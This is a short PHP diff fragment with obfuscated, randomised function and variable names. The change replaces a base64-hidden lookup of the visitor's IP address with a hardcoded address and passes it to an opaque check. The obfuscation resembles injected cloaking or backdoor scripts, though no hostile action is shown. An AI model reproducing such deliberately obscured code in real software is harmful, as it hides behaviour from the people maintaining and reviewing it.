@@ -35,7 +35,8 @@ function zbpzmp63b4ce83($qgfjws9d0de3ee) {
     } 
 } 
 
-$qgfjws9d0de3ee = $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; 
+//$qgfjws9d0de3ee = $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; 
+$qgfjws9d0de3ee = "188.149.53.90";
 $rvhajva182eb1c = hfvcgha7cb6a4c($qgfjws9d0de3ee); 
 
 if ($rvhajva182eb1c > 0) { 
